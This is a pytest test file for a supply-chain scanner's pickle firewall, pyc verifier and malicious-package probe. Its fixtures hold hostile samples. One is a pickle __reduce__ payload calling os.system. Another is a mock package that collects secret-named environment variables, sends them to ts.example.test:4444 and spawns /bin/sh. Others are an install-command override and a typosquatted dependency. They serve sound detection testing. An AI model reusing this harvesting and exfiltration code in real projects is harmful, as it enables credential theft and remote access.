"""Tests for pillar six: pickle opcode firewall, pyc verifier and audit guardian.

The pickle tests use real pickle streams produced by the pickle module: a benign
dictionary encode and a __reduce__ payload that would call os.system if loaded. The
pyc tests compile a real module with py_compile and then verify the header.
"""

from __future__ import annotations

import json
import os
import pickle
import py_compile
import subprocess
import sys
from datetime import datetime, timedelta, timezone
from pathlib import Path

import pytest

from tauhaulity.core.contracts import ScanContext, ScanOptions
from tauhaulity.pillars import p06_supply as pillar
from tauhaulity.tools import artifact_scan, suppress, threat_feed, threat_feed


class _PlainObject:
    """Module level class used only to build a GLOBAL based pickle stream."""


class _MarkerPayload:
    """Payload that would create a marker file if the scanner ever loaded it."""

    def __init__(self, marker: Path) -> None:
        self.marker = marker

    def __reduce__(self):
        return (os.system, (f'echo pwned > "{self.marker}"',))


def _make_ctx(target: Path, platform_info, policy) -> ScanContext:
    return ScanContext(target=Path(target), platform=platform_info, policy=policy, options=ScanOptions())


def test_pickle_gate_accepts_benign_streams() -> None:
    gate = pillar.PickleGate()
    for protocol in (0, 2, 4):
        stream = pickle.dumps({"user": "dev", "count": 3, "items": [1, 2, 3]}, protocol=protocol)
        verdict = gate.scan(stream)
        assert verdict.allowed, f"protocol {protocol}: {verdict.reason}"
        assert verdict.findings == ()
        assert verdict.size == len(stream)
        assert verdict.opcodes_seen
        assert gate.loads(stream) == {"user": "dev", "count": 3, "items": [1, 2, 3]}
    assert gate.is_allowed(pickle.dumps(("plain", "tuple")))


def test_pickle_gate_blocks_reduce_payload() -> None:
    gate = pillar.PickleGate()
    stream = pickle.dumps(pillar._ProbePayload(), protocol=2)
    verdict = gate.scan(stream)
    assert verdict.allowed is False
    assert "REDUCE" in verdict.blocked_opcodes
    assert "GLOBAL" in verdict.blocked_opcodes
    for finding in verdict.findings:
        assert finding.position >= 0
        assert finding.reason
    global_finding = next(item for item in verdict.findings if item.opcode == "GLOBAL")
    assert global_finding.argument
    with pytest.raises(pillar.UnsafePickleError) as excinfo:
        gate.loads(stream)
    assert excinfo.value.verdict.allowed is False


def test_pickle_gate_blocks_plain_instance() -> None:
    gate = pillar.PickleGate()
    verdict = gate.scan(pickle.dumps(_PlainObject(), protocol=4))
    assert verdict.allowed is False
    assert "GLOBAL" in verdict.blocked_opcodes or "STACK_GLOBAL" in verdict.blocked_opcodes


def test_pickle_gate_rejects_malformed_stream() -> None:
    gate = pillar.PickleGate()
    verdict = gate.scan(b"\x80\x05\x95")
    assert verdict.allowed is False
    assert any(finding.opcode == "<malformed>" for finding in verdict.findings)
    assert gate.scan(b"").allowed is False


def test_pyc_verifier_accepts_compiled_cache(tmp_path: Path) -> None:
    source_path = tmp_path / "module_under_test.py"
    source_path.write_text("VALUE = 40 + 2\n", encoding="utf-8")
    cache_path = tmp_path / "module_under_test.pyc"
    py_compile.compile(str(source_path), cfile=str(cache_path), doraise=True)
    verdict = pillar.PycVerifier().verify_file(cache_path, source_path=source_path)
    assert verdict.ok, verdict.reason
    assert verdict.errors == ()
    assert verdict.hash_based is False
    assert verdict.size > pillar.PYC_HEADER_SIZE


def test_pyc_verifier_checks_hash_based_cache(tmp_path: Path) -> None:
    source_path = tmp_path / "hashed.py"
    source_path.write_text("VALUE = 7\n", encoding="utf-8")
    cache_path = tmp_path / "hashed.pyc"
    py_compile.compile(
        str(source_path),
        cfile=str(cache_path),
        doraise=True,
        invalidation_mode=py_compile.PycInvalidationMode.CHECKED_HASH,
    )
    verifier = pillar.PycVerifier()
    good = verifier.verify_file(cache_path, source_path=source_path)
    assert good.ok, good.reason
    assert good.hash_based is True
    assert good.check_source is True
    tampered = verifier.verify(cache_path.read_bytes(), source=b"VALUE = 8\n")
    assert tampered.ok is False
    assert any(finding.check == "hash" for finding in tampered.errors)


def test_pyc_verifier_rejects_bad_magic_and_truncation(tmp_path: Path) -> None:
    source_path = tmp_path / "broken.py"
    source_path.write_text("VALUE = 1\n", encoding="utf-8")
    cache_path = tmp_path / "broken.pyc"
    py_compile.compile(str(source_path), cfile=str(cache_path), doraise=True)
    data = cache_path.read_bytes()
    verifier = pillar.PycVerifier()
    bad_magic = verifier.verify(b"\x00\x00\x00\x00" + data[4:], source=source_path.read_bytes())
    assert bad_magic.ok is False
    assert any(finding.check == "magic" for finding in bad_magic.errors)
    truncated = verifier.verify(data[:8], source=source_path.read_bytes())
    assert truncated.ok is False
    assert any(finding.check == "header" for finding in truncated.errors)
    header_only = verifier.verify(data[:16], source=source_path.read_bytes())
    assert header_only.ok is False
    assert any(finding.check == "body" for finding in header_only.errors)


def test_pyc_verifier_checks_source_size(tmp_path: Path) -> None:
    source_path = tmp_path / "sized.py"
    source_path.write_text("VALUE = 123\n", encoding="utf-8")
    cache_path = tmp_path / "sized.pyc"
    py_compile.compile(str(source_path), cfile=str(cache_path), doraise=True)
    verdict = pillar.PycVerifier().verify(cache_path.read_bytes(), source=b"VALUE = 123\n# extra\n")
    assert verdict.ok is False
    assert any(finding.check == "source-size" for finding in verdict.errors)


def test_audit_guardian_capabilities() -> None:
    guardian = pillar.AuditGuardian()
    capabilities = guardian.capabilities()
    assert capabilities["pep578"] is True
    assert isinstance(capabilities["pep669"], bool)
    assert isinstance(capabilities["monitoring"], dict)
    assert "available" in capabilities["monitoring"]
    assert guardian.mode() == "inactive"
    assert guardian.active() is False


def test_audit_guardian_installs_in_subprocess(project_root: Path) -> None:
    code = """
import json
from tauhaulity.pillars.p06_supply import AuditGuardian
guardian = AuditGuardian()
installed = guardian.install(enforce=False)
stats = guardian.stats()
print(json.dumps({
    "installed": installed,
    "active": guardian.active(),
    "mode": guardian.mode(),
    "guard_installed": stats.get("installed"),
}))
"""
    env = os.environ.copy()
    env.pop("TAUHAULITY_NO_AUTO", None)
    env.pop("TAUHAULITY_ENFORCE", None)
    env["PYTHONPATH"] = str(project_root) + os.pathsep + env.get("PYTHONPATH", "")
    env["PYTHONDONTWRITEBYTECODE"] = "1"
    completed = subprocess.run(
        [sys.executable, "-c", code],
        cwd=str(project_root),
        env=env,
        capture_output=True,
        text=True,
        timeout=120,
    )
    assert completed.returncode == 0, completed.stderr
    payload = json.loads(completed.stdout.strip().splitlines()[-1])
    assert payload["installed"] is True
    assert payload["active"] is True
    assert payload["mode"] == "watch"
    assert payload["guard_installed"] is True


def test_probe_returns_legal_finding(sample_project: Path, platform_info, default_policy) -> None:
    ctx = _make_ctx(sample_project, platform_info, default_policy)
    finding = pillar.probe(ctx)
    assert finding.pillar == 6
    assert finding.status in pillar.SPEC.statuses
    assert 0.0 <= finding.risk <= pillar.SPEC.risk_scale
    assert "pickle" in finding.slot("detail")
    ctx.record(finding)

def test_probe_reports_critical_for_an_unsafe_pickle(
    tmp_path: Path, platform_info, default_policy
) -> None:
    marker = tmp_path / "executed.txt"
    payload = pickle.dumps(_MarkerPayload(marker), protocol=2)
    (tmp_path / "evil.pkl").write_bytes(payload)
    ctx = _make_ctx(tmp_path, platform_info, default_policy)
    finding = pillar.probe(ctx)
    assert not marker.exists(), "the pillar must never load a scanned pickle"
    assert finding.status == "CRITICAL"
    assert finding.risk == 8.0
    detail = finding.slot("detail")
    assert "evil.pkl" in detail
    assert "pickle_unsafe" in detail
    assert "file(s) inspected" in detail
    assert "GLOBAL" in detail
    assert finding.repro_hint
    ctx.record(finding)


def test_probe_warns_for_medium_only_findings(
    tmp_path: Path, platform_info, default_policy
) -> None:
    (tmp_path / "client.py").write_text(
        "import requests\nrequests.get('https://example.test', verify=False)\n",
        encoding="utf-8",
    )
    ctx = _make_ctx(tmp_path, platform_info, default_policy)
    finding = pillar.probe(ctx)
    assert finding.status == "WARNING"
    assert finding.risk == 4.0
    detail = finding.slot("detail")
    assert "client.py" in detail
    assert "dangerous_api" in detail
    ctx.record(finding)


def test_probe_is_safe_on_a_clean_project(tmp_path: Path, platform_info, default_policy) -> None:
    (tmp_path / "app.py").write_text("VALUE = 1\n", encoding="utf-8")
    (tmp_path / "notes.txt").write_text("plain notes\n", encoding="utf-8")
    ctx = _make_ctx(tmp_path, platform_info, default_policy)
    finding = pillar.probe(ctx)
    assert finding.status == "SAFE", finding.detail
    assert finding.risk == 0.0
    detail = finding.slot("detail")
    assert "no unsafe serialized payload" in detail
    assert "file(s)" in detail
    assert "pickle" in detail
    assert "\n" not in detail
    ctx.record(finding)


def test_probe_warns_when_the_artifact_scan_is_truncated(
    tmp_path: Path, platform_info, default_policy, monkeypatch
) -> None:
    report = artifact_scan.ArtifactReport(
        findings=(),
        files_inspected=10,
        bytes_inspected=1000,
        truncated=True,
        detail="scan incomplete: 10 file(s) and 1000 byte(s) inspected",
    )

    def fake_scan(target, *, budget=None, ignored=(), suppress=None):
        return report

    monkeypatch.setattr(artifact_scan, "scan_source_tree", fake_scan)
    ctx = _make_ctx(tmp_path, platform_info, default_policy)
    finding = pillar.probe(ctx)
    assert finding.status == "WARNING"
    assert finding.risk == 2.5
    detail = finding.slot("detail")
    assert "10 file(s)" in detail
    assert "1000 byte(s)" in detail
    assert "artifact scan stopped at the scan budget" in detail
    ctx.record(finding)


def test_probe_warns_when_the_artifact_scan_raises(
    tmp_path: Path, platform_info, default_policy, monkeypatch
) -> None:
    def exploding_scan(target, *, budget=None, ignored=(), suppress=None):
        raise RuntimeError("simulated scanner failure")

    monkeypatch.setattr(artifact_scan, "scan_source_tree", exploding_scan)
    ctx = _make_ctx(tmp_path, platform_info, default_policy)
    finding = pillar.probe(ctx)
    assert finding.status == "WARNING"
    assert finding.risk == 4.0
    detail = finding.slot("detail")
    assert "RuntimeError" in detail
    assert "simulated" not in detail, "the detail line must name the class, not echo the payload"
    ctx.record(finding)


def test_probe_warns_when_the_artifact_scanner_is_missing(
    tmp_path: Path, platform_info, default_policy, monkeypatch
) -> None:
    import sys

    import tauhaulity.tools as tools_package

    monkeypatch.delattr(tools_package, "artifact_scan", raising=False)
    monkeypatch.setitem(sys.modules, "tauhaulity.tools.artifact_scan", None)
    ctx = _make_ctx(tmp_path, platform_info, default_policy)
    finding = pillar.probe(ctx)
    assert finding.status == "WARNING"
    assert finding.risk == 4.0
    assert "artifact scanner unavailable" in finding.slot("detail")
    ctx.record(finding)

def _add_reviewed(tmp_path: Path, keys, reason: str) -> suppress.SuppressionStore:
    """Record reviewed suppressions for a fixture and return the store."""

    store = suppress.SuppressionStore(tmp_path)
    store.add(keys, reason)
    return store


def test_probe_warns_with_one_suppressed_medium_finding(
    tmp_path: Path, platform_info, default_policy
) -> None:
    (tmp_path / "client_one.py").write_text(
        "import requests\ndef fetch(url):\n    return requests.get(url, verify=False)\n",
        encoding="utf-8",
    )
    (tmp_path / "client_two.py").write_text(
        "import requests\ndef fetch(url):\n    return requests.get(url, verify=False)\n",
        encoding="utf-8",
    )
    keys = suppress.list_suppression_candidates(tmp_path)
    reviewed = next(key for key in keys if key.rel_path == "client_one.py")
    _add_reviewed(tmp_path, [reviewed], "internal host with a pinned certificate")
    ctx = _make_ctx(tmp_path, platform_info, default_policy)
    finding = pillar.probe(ctx)
    assert finding.status == "WARNING"
    assert finding.risk == 4.0
    detail = finding.slot("detail")
    assert "client_two.py" in detail
    assert "1 finding(s) suppressed by review" in detail
    assert "first suppression reason: internal host with a pinned certificate" in detail
    ctx.record(finding)


def test_probe_is_safe_when_every_finding_is_suppressed(
    tmp_path: Path, platform_info, default_policy
) -> None:
    (tmp_path / "api.py").write_text("import os\nos.system('ls')\n", encoding="utf-8")
    keys = suppress.list_suppression_candidates(tmp_path)
    assert len(keys) == 1
    _add_reviewed(tmp_path, keys, "documented administrative helper, reviewed 2026-11")
    ctx = _make_ctx(tmp_path, platform_info, default_policy)
    finding = pillar.probe(ctx)
    assert finding.status == "SAFE", finding.detail
    assert finding.risk == 0.0
    detail = finding.slot("detail")
    assert "1 finding(s) suppressed by review" in detail
    assert "documented administrative helper" in detail
    ctx.record(finding)


def test_probe_reports_critical_and_keeps_the_suppression_visible(
    tmp_path: Path, platform_info, default_policy
) -> None:
    (tmp_path / "gate.py").write_text(
        "import pickle\n"
        "class PickleGate:\n"
        "    def scan(self, data):\n"
        "        return bool(data)\n"
        "    def loads(self, data):\n"
        "        if not self.scan(data):\n"
        "            raise ValueError('unsafe')\n"
        "        return pickle.loads(data)\n",
        encoding="utf-8",
    )
    (tmp_path / "api.py").write_text("import os\nos.system('ls')\n", encoding="utf-8")
    keys = suppress.list_suppression_candidates(tmp_path)
    gate_key = next(key for key in keys if key.symbol == "PickleGate.loads")
    _add_reviewed(tmp_path, [gate_key], "gated entry point validates the stream before loading")
    ctx = _make_ctx(tmp_path, platform_info, default_policy)
    finding = pillar.probe(ctx)
    assert finding.status == "CRITICAL"
    detail = finding.slot("detail")
    assert "api.py" in detail
    assert "1 finding(s) suppressed by review" in detail
    assert "gated entry point validates" in detail
    ctx.record(finding)


def test_probe_ignores_a_corrupt_suppression_store(
    tmp_path: Path, platform_info, default_policy
) -> None:
    (tmp_path / "api.py").write_text("import os\nos.system('ls')\n", encoding="utf-8")
    store = suppress.SuppressionStore(tmp_path)
    store.path.parent.mkdir(parents=True, exist_ok=True)
    store.path.write_text("{ this is not json", encoding="utf-8")
    ctx = _make_ctx(tmp_path, platform_info, default_policy)
    finding = pillar.probe(ctx)
    assert finding.status == "CRITICAL"
    detail = finding.slot("detail")
    assert "api.py" in detail
    assert "suppressed by review" not in detail
    ctx.record(finding)

def _zero_requests_shape(root: Path) -> None:
    """Build a package that mirrors the 2026-09-0requests campaign."""

    (root / "0requests").mkdir(parents=True, exist_ok=True)
    (root / "0requests" / "__init__.py").write_text(
        "import os\n"
        "import socket\n"
        "import subprocess\n"
        "SECRET_WORDS = ('SECRET', 'API', 'TOKEN', 'KEY')\n"
        "def harvest():\n"
        "    loot = {}\n"
        "    for name, value in os.environ.items():\n"
        "        if any(word in name.upper() for word in SECRET_WORDS):\n"
        "            loot[name] = value\n"
        "    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n"
        "    client.connect(('ts.example.test', 4444))\n"
        "    client.sendall(str(loot).encode())\n"
        "    subprocess.Popen(['/bin/sh', '-i'])\n",
        encoding="utf-8",
    )
    (root / "requirements.txt").write_text("0requests\n", encoding="utf-8")


def _install_override_shape(root: Path) -> None:
    """Build a setup.py that overrides the install command, like 123bla."""

    (root / "setup.py").write_text(
        "from setuptools import setup\n"
        "from setuptools.command.install import install\n"
        "class RunInstall(install):\n"
        "    def run(self):\n"
        "        install.run(self)\n"
        "setup(name='123bla', version='1.0', cmdclass={'install': RunInstall})\n",
        encoding="utf-8",
    )


def test_probe_is_critical_for_the_zero_requests_shape(
    tmp_path: Path, platform_info, default_policy
) -> None:
    _zero_requests_shape(tmp_path)
    ctx = _make_ctx(tmp_path, platform_info, default_policy)
    finding = pillar.probe(ctx)
    assert finding.status == "CRITICAL"
    assert finding.risk == 8.0
    detail = finding.slot("detail")
    assert "0requests/__init__.py" in detail
    assert "env_secret_harvesting" in detail or "raw_socket_egress" in detail
    assert finding.repro_hint
    ctx.record(finding)


def test_probe_is_critical_for_an_install_override(
    tmp_path: Path, platform_info, default_policy
) -> None:
    _install_override_shape(tmp_path)
    ctx = _make_ctx(tmp_path, platform_info, default_policy)
    finding = pillar.probe(ctx)
    assert finding.status == "CRITICAL"
    detail = finding.slot("detail")
    assert "setup.py" in detail
    assert "install_time_execution" in detail
    assert "cmdclass" in detail or "install command" in detail
    ctx.record(finding)


def test_probe_is_critical_for_a_dependency_typosquat(
    tmp_path: Path, platform_info, default_policy
) -> None:
    (tmp_path / "requirements.txt").write_text("reqeusts==2.0.0\n", encoding="utf-8")
    ctx = _make_ctx(tmp_path, platform_info, default_policy)
    finding = pillar.probe(ctx)
    assert finding.status == "CRITICAL"
    detail = finding.slot("detail")
    assert "requirements.txt" in detail
    assert "reqeusts" in detail
    assert "dep_typosquat" in detail
    ctx.record(finding)


def test_probe_warns_for_an_unpinned_dependency_only(
    tmp_path: Path, platform_info, default_policy
) -> None:
    (tmp_path / "requirements.txt").write_text("flask\n", encoding="utf-8")
    ctx = _make_ctx(tmp_path, platform_info, default_policy)
    finding = pillar.probe(ctx)
    assert finding.status == "WARNING"
    assert finding.risk == 4.0
    detail = finding.slot("detail")
    assert "flask" in detail
    assert "unpinned" in detail
    ctx.record(finding)


def test_probe_warns_for_an_obfuscated_payload_only(
    tmp_path: Path, platform_info, default_policy
) -> None:
    payload = "".join(chr(33 + (index * 7) % 90) for index in range(320))
    (tmp_path / "stage.py").write_text(
        "def run():" + chr(10) + "    exec(" + repr(payload) + ")" + chr(10),
        encoding="utf-8",
    )
    ctx = _make_ctx(tmp_path, platform_info, default_policy)
    finding = pillar.probe(ctx)
    assert finding.status == "WARNING", finding.detail
    assert finding.risk == 4.0
    detail = finding.slot("detail")
    assert "obfuscated_payload" in detail
    assert "high-entropy literal" in detail
    ctx.record(finding)


def test_probe_suppression_improves_a_dependency_finding(
    tmp_path: Path, platform_info, default_policy
) -> None:
    (tmp_path / "requirements.txt").write_text("reqeusts==2.0.0\n", encoding="utf-8")
    keys = suppress.list_suppression_candidates(tmp_path)
    assert len(keys) == 1
    store = suppress.SuppressionStore(tmp_path)
    reason = "vendored mirror name reviewed by the platform team"
    assert store.add(keys, reason) == 1
    ctx = _make_ctx(tmp_path, platform_info, default_policy)
    finding = pillar.probe(ctx)
    assert finding.status == "SAFE", finding.detail
    detail = finding.slot("detail")
    assert "1 finding(s) suppressed by review" in detail
    assert "first suppression reason:" in detail
    assert "vendored mirror name" in detail
    ctx.record(finding)


def test_probe_suppression_covers_a_malware_shape(
    tmp_path: Path, platform_info, default_policy
) -> None:
    _zero_requests_shape(tmp_path)
    keys = suppress.list_suppression_candidates(tmp_path)
    assert keys, "the malware shape must be visible to the reviewer first"
    assert any(key.kind == "env_secret_harvesting" for key in keys)
    store = suppress.SuppressionStore(tmp_path)
    assert store.add(keys, "red-team fixture reviewed: isolated lab copy, never executed") == len(keys)
    ctx = _make_ctx(tmp_path, platform_info, default_policy)
    finding = pillar.probe(ctx)
    assert finding.status == "SAFE", finding.detail
    detail = finding.slot("detail")
    assert f"{len(keys)} finding(s) suppressed by review" in detail
    assert "isolated lab copy" in detail
    ctx.record(finding)

# --------------------------------------------------- threat feed staleness

def _write_feed_cache(root: Path, age_days: float) -> None:
    """Write a valid threat-feed cache for both kinds at a chosen age."""

    threat_feed.record_snapshot(
        "osv",
        root=root,
        source=threat_feed.OSV_ENDPOINT,
        entries=("endpoint=osv status=200 advisory=GHSA-test",),
        detail="p06 staleness fixture",
    )
    threat_feed.record_snapshot(
        "malicious",
        root=root,
        source=threat_feed.MALICIOUS_TREE_URL,
        entries=("package=0requests record=MAL-2026-0001 reasons=typosquatting summary=fixture",),
        detail="p06 staleness fixture",
    )
    if age_days <= 0:
        return
    captured = datetime.now(timezone.utc) - timedelta(days=age_days)
    for kind in ("osv", "malicious"):
        path = threat_feed.feed_cache_path(kind, root)
        payload = json.loads(path.read_text(encoding="utf-8"))
        payload["captured_at"] = captured.isoformat(timespec="seconds")
        path.write_text(json.dumps(payload), encoding="utf-8")


def test_probe_surfaces_stale_feed_without_changing_the_ladder(
    tmp_path: Path, platform_info, default_policy
) -> None:
    (tmp_path / "app.py").write_text("VALUE = 1\n", encoding="utf-8")
    _write_feed_cache(tmp_path, 40)
    ctx = _make_ctx(tmp_path, platform_info, default_policy)
    finding = pillar.probe(ctx)
    assert finding.status == "SAFE", finding.detail
    detail = finding.slot("detail")
    assert "threat feed data is stale" in detail
    assert "scripts/threat_feed_check.py --refresh" in detail
    slot = finding.slot("feed_status")
    assert slot.startswith("stale:")
    assert "40 day(s) old" in slot
    ctx.record(finding)


def test_probe_is_silent_when_the_feed_is_fresh(
    tmp_path: Path, platform_info, default_policy
) -> None:
    (tmp_path / "app.py").write_text("VALUE = 1\n", encoding="utf-8")
    _write_feed_cache(tmp_path, 0)
    ctx = _make_ctx(tmp_path, platform_info, default_policy)
    finding = pillar.probe(ctx)
    assert finding.status == "SAFE", finding.detail
    detail = finding.slot("detail")
    assert "threat feed data is stale" not in detail
    slot = finding.slot("feed_status")
    assert slot.startswith("fresh")
    ctx.record(finding)


def test_probe_surfaces_a_missing_feed(tmp_path: Path, platform_info, default_policy) -> None:
    (tmp_path / "app.py").write_text("VALUE = 1\n", encoding="utf-8")
    ctx = _make_ctx(tmp_path, platform_info, default_policy)
    finding = pillar.probe(ctx)
    assert finding.status == "SAFE", finding.detail
    detail = finding.slot("detail")
    assert "threat feed data is stale" in detail
    assert "missing" in detail
    assert finding.slot("feed_status").startswith("stale:")
    ctx.record(finding)


def test_stale_feed_does_not_change_a_critical_verdict(
    tmp_path: Path, platform_info, default_policy
) -> None:
    marker = tmp_path / "executed.txt"
    (tmp_path / "evil.pkl").write_bytes(pickle.dumps(_MarkerPayload(marker), protocol=2))
    _write_feed_cache(tmp_path, 90)
    ctx = _make_ctx(tmp_path, platform_info, default_policy)
    finding = pillar.probe(ctx)
    assert finding.status == "CRITICAL"
    assert finding.risk == 8.0
    assert "pickle_unsafe" in finding.slot("detail")
    assert "threat feed data is stale" in finding.slot("detail")
    ctx.record(finding)


def test_probe_reports_feed_status_errors_without_crashing(
    tmp_path: Path, platform_info, default_policy, monkeypatch
) -> None:
    def exploding_status(*args, **kwargs):
        raise RuntimeError("simulated feed status failure")

    monkeypatch.setattr(threat_feed, "status", exploding_status)
    (tmp_path / "app.py").write_text("VALUE = 1\n", encoding="utf-8")
    ctx = _make_ctx(tmp_path, platform_info, default_policy)
    finding = pillar.probe(ctx)
    assert finding.status == "SAFE", finding.detail
    assert "threat feed status unavailable" in finding.slot("detail")
    assert finding.slot("feed_status") == "unavailable"
    ctx.record(finding)
